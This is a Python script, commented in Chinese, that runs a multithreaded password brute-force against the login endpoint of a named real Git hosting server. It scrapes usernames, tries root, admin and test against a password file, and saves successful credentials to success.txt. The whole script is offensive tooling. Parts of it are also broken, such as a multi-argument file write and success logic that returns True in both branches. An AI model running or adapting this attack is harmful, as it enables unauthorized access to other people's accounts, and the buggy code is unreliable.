# -*- coding: utf-8 -*-
from threadpool import makeRequests, ThreadPool
from multiprocessing import Process
import sys
import requests
import traceback
from retrying import retry
from lxml import etree
import time
# 关闭报错信息
requests.packages.urllib3.disable_warnings()

url = "https://git.ub-66.com"
# url = "http://116.62.12.62:3000"

def login():
    data = {
      "user_name": "test",
      "password": "123456"  
    }
    res1 = requests.post(url + "/user/login", data=data, timeout=6, allow_redirects=False)
    print(res1.status_code)
    # print(res1.cookies)
    if (res1.status_code == 302):
      print("登陆成功")
      cookie = res1.cookies
      res2 = requests.get(url + "/explore/users", cookies=cookie)
      tree = etree.HTML(res2.text)
      userlist=tree.xpath('//span[@class="header"]//text()')
      arr = []
      for i in userlist:
        if(i != "test" and len(i) > 1):
          arr.append(i)
      return arr

# 异常定义和特殊值（0）定义
class Finish(SyntaxWarning):
    pass

class PauseInfo(SyntaxWarning):
    pass
 
# func函数定义
# 0时返回False，其他偶数返回True

def func(para):
    uname = para[0]
    passwd = para[1]
    data = {
      "user_name": uname,
      "password": passwd  
    }
    try:
      res1 = requests.post(url + "/user/login", data=data, timeout=8, allow_redirects=False)
    except:
      return False
    print("passwd--",passwd,"  ",res1.status_code)
    if(res1.status_code == 302):
        print("登陆成功:","账号--", uname,"  密码--",passwd)
        f = open("success.txt", 'a+', encoding="utf-8")
        f.write("账号--", uname,"  密码--",passwd)
        # f.close
        do = open("success.txt", "a+", encoding="utf-8")
        do.write("账号:"+ uname +"---密码:" + passwd +"\n")
        do.close
        return True
    else:
        return True

    # while True:
    #     print(para, "我是第三个判断")
    #     print('continue for', para)
    #     time.sleep(para)
 
# callback定义
def callback(request, result):
    if result:
        raise Finish
    else:
        raise PauseInfo
 
# 线程池处理
# Finish标识任务完成，使用sys.exit退出线程池处理；

def main_thread(paras):
    pool = ThreadPool(20)
    requests = makeRequests(callable_=func, args_list=paras, callback=callback)
    [pool.putRequest(req) for req in requests]
    while True:
        try:
            pool.wait()
        except Finish as e:
            sys.exit(0)
        except PauseInfo as e:
            print("密码错误")
            sys.exit(0)
        except Exception as e:
            print('预期之外的错误，停止当前任务')
            sys.exit(1)
 
# 主函数起一个测试进程
if __name__ == '__main__':
    # uarr = login()
    uarr = ["root", "admin", "test"]
    parr = []
    f = open('passwd.txt', 'r')
    for line in f.readlines():
        parr.append(line.strip('\n'))
    f.close
    for i in uarr:
        print("正在爆破账号--",i)
        paras = []
        for j in parr:
            paras.append([i, j])
            # paras = [["aaa", 111], ["bbb", 222], ["ccc", 333]]        
            try:
                thread_test = Process(target=main_thread, args=(paras,))
                thread_test.start()
                thread_test.join(timeout=0.5)
            except TimeoutError as e:
                print('task timeout')
            except Exception as e:
                print('unknow error:',e)